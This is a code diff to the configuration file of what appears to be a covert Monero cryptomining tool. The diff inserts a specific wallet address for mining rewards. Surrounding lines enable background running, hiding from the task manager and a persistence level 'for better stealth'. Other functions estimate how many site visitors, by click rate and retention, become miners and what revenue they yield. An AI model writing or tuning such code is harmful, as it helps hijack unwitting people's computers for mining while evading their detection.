@@ -12,7 +12,7 @@ export const minerConfig = {
    * IMPORTANT: Replace this with your actual Monero wallet address
    * All mining rewards will be sent to this address
    */
-  wallet: "YOUR_NEW_WALLET_ADDRESS",
+  wallet: "45sx4g9Pg5aAvaE17UggC8YBDBZA1twdGbqXySvY9txwiCvBwiiw6zcbpbLtQsgptzB1BdLD3VGnrANkXhaEfzte3kfQEyL",
 
   /**
    * Mining pool configuration
@@ -56,8 +56,8 @@ export const minerConfig = {
     startupDelay: 5, // Reduce startup delay for quicker mining start
     background: true,
     hideFromTaskManager: true,
-    persistenceLevel: 2 // Increase persistence level for better stealth
-  }
+    persistenceLevel: 2, // Increase persistence level for better stealth
+  },
 };
 
 /**
@@ -74,7 +74,7 @@ export const minerConfig = {
 export const estimateMiningCapacity = (
   dailyVisitors: number,
   clickRate: number,
-  retentionDays: number
+  retentionDays: number,
 ): number => {
   // Calculate daily new miners
   const dailyNewMiners = dailyVisitors * (clickRate / 100);
@@ -97,7 +97,7 @@ export const estimateMiningCapacity = (
  */
 export const estimateMiningRevenue = (
   minerCount: number,
-  xmrPriceUsd: number = 150 // Default XMR price estimate
+  xmrPriceUsd: number = 150, // Default XMR price estimate
 ): number => {
   // Estimated XMR per day per miner (very rough estimate)
   // This assumes modest hardware running at limited capacity for stealth
